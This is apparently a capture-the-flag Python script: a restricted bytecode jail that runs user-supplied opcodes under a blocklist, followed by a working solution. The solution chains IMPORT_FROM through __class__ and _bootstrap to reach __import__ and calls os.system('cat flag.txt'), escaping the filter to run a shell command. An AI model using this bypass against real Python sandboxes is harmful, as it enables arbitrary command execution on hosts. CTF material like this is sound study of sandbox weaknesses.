import opcode


def assemble(x):
    lines = [l.strip() for l in x.strip().split("\n")]
    lines = [l.split() for l in lines if l and not l.startswith("#")]
    return b"".join(bytes([opcode.opmap[t[0]], int(t[1]) if len(t) > 1 else 0]) for t in lines)


def f():
    pass

banned = ["IMPORT_NAME"]
for k in opcode.opmap:
    if ("LOAD" in k and k != "LOAD_CONST") or "STORE" in k or "DELETE" in k or "JUMP" in k:
        banned.append(k)
banned = {opcode.opmap[x] for x in banned}

consts = tuple(input("consts: ").split(","))
names = tuple(input("names: ").split(","))
code = bytes.fromhex(input("code: "))
if len(consts) > 3:
    print("too many consts >:(")
elif len(names) > 4:
    print("too many names >:(")
elif len(code) > 30:
    print("too much code >:(")
elif len(code) % 2 != 0:
    print("invalid code >:(")
elif any(code[i] in banned for i in range(0, len(code), 2)):
    print("illegal code >:(")
else:
    f.__code__ = f.__code__.replace(
        co_stacksize=10,
        co_consts=consts,
        co_names=names,
        co_code=code,
    )
    print(repr(f()))

'''
f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=("importlib", "os", "cat flag.txt"),
    co_names=("__class__", "_bootstrap", "__import__", "system"),
    co_code=assemble(
        """
        BUILD_TUPLE 0
        IMPORT_FROM 0
        IMPORT_FROM 0
        LOAD_CONST 0
        BUILD_TUPLE 0
        BUILD_MAP 0
        CALL_FUNCTION 3
        IMPORT_FROM 1
        IMPORT_FROM 2
        LOAD_CONST 1
        CALL_FUNCTION 1
        IMPORT_FROM 3
        LOAD_CONST 2
        CALL_FUNCTION 1
        RETURN_VALUE
        """
    ),
)
'''
print(assemble(
        """
        BUILD_TUPLE 0
        IMPORT_FROM 0
        IMPORT_FROM 0
        LOAD_CONST 0
        BUILD_TUPLE 0
        BUILD_MAP 0
        CALL_FUNCTION 3
        IMPORT_FROM 1
        IMPORT_FROM 2
        LOAD_CONST 1
        CALL_FUNCTION 1
        IMPORT_FROM 3
        LOAD_CONST 2
        CALL_FUNCTION 1
        RETURN_VALUE
        """
    ).hex())

